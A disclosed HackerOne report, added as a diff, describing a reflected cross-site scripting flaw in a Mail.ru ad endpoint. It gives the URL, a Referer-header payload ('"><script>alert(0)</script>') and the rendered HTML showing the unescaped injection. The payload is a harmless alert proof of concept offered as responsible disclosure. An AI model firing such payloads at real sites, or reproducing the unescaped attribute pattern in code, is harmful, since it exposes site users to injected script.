@@ -1,0 +1,33 @@
+ReportLink:https://hackerone.com/reports/51061
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/ddworken
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:02.05.2015 17:33:59
+
+Summary:
+
+The XSS vulnerability is located here:
+
+```
+https://ad.mail.ru/adi/3030
+```
+
+and is triggered by setting referer to:
+
+```
+"><script>alert(0)</script>
+```
+
+The problem is that the referer is being loaded like so:
+
+```html
+ <ins class="adsbygoogle" style="display:inline-block;width:300px;height:250px" data-ad-client="ca-pub-4831681952934476" data-ad-slot="7515917252" data-override-format="true" data-page-url = "">
+<script>
+    alert(0)
+</script>">
+```
+
+I am aware that this is out of scope, but I am still reporting it since I just happened to spot it while looking for other bugs. 
